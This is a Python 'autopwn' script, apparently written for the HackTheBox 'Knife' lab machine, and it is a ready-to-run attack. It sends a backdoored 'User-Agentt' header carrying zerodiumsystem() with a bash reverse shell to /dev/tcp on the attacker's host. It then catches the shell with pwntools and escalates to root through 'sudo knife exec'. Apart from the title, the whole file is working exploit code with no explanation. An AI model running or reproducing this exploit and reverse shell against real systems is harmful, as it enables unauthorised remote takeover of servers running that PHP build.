#!/usr/bin/python3

from pwn import *
import signal
import requests

def interrupt_handler(sig, frame):
    print("\nExiting...\n")
    sys.exit(1)

# When Ctrl+C (SIGINT signal) is received, interrupt_handler handler is called
signal.signal(signal.SIGINT, interrupt_handler)

def gain_Access(url, local, port):
    
    headers = {
        'User-Agentt': "zerodiumsystem(\"bash -c \'bash -i >& /dev/tcp/" + local + "/" + port + " 0>&1\'\");"
    }
    
    r = requests.get(url, headers=headers)

if __name__ == '__main__':

    prog = log.progress("Autopwn Knife Box - HTB")

    time.sleep(2)

    if len(sys.argv) != 4:
        prog.failure("\n\nWrong number of arguments\n\n<target IP>\n<local IP>\n<port>\n")
        sys.exit(1)
    
    prog.status("\nArguments introduced correctly, validating...\n")

    ip = sys.argv[1]
    local = sys.argv[2]
    port = sys.argv[3]

    time.sleep(3)

    response = subprocess.Popen(
        ['ping', '-c', '1', ip], stdout=subprocess.PIPE)    
    local_response = subprocess.Popen(
          ['ping', '-c', '1', local], stdout=subprocess.PIPE)
    
    response.communicate()
    local_response.communicate()
    
    if response.returncode != 0 or local_response.returncode != 0 or ip == local:
        prog.failure("\nInvalid IP's introduced, check them out\n")
        sys.exit(1)
        
    prog.status("\nExploiting 'User Agentt' Remote Code Execution.\n")
    prog.status("\nGaining access...\n")

    time.sleep(3)

    url = "http://"+ip

    try:
        accessThread = threading.Thread(target=gain_Access, args=(url, local, port,)).start()
    except Exception as e:
        prog.failure("\nAn unexpected error has occurred, exiting...\n")
        log.error(str(e))

    reverse_shell = listen(port, timeout=20).wait_for_connection()

    if reverse_shell.sock is None:
        prog.failure("\nThe system could not be pwned, exiting...\n")
        sys.exit(1)
    else:
        prog.success("\nAccess gained\n")
        reverse_shell.sendline("sudo knife exec -E 'exec \"/bin/sh\"'")
        reverse_shell.interactive()
